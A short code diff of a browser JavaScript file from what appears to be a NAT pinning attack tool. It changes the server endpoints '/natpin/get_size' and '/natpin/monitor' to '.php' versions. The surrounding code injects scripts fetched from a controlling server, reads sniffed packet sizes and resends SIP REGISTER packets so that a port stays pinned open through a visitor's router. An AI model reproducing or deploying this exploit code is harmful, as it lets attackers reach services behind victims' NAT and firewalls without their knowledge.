@@ -305,7 +305,7 @@ function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//' + serverName + '/natpin/get_size?id=' + rand + '&rand=' + rnd()
+	scr.src = '//' + serverName + '/natpin/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
 	document.head.appendChild(scr)
 }
@@ -393,7 +393,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//' + serverName + '/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//' + serverName + '/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -523,7 +523,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//' + serverName + '/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//' + serverName + '/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
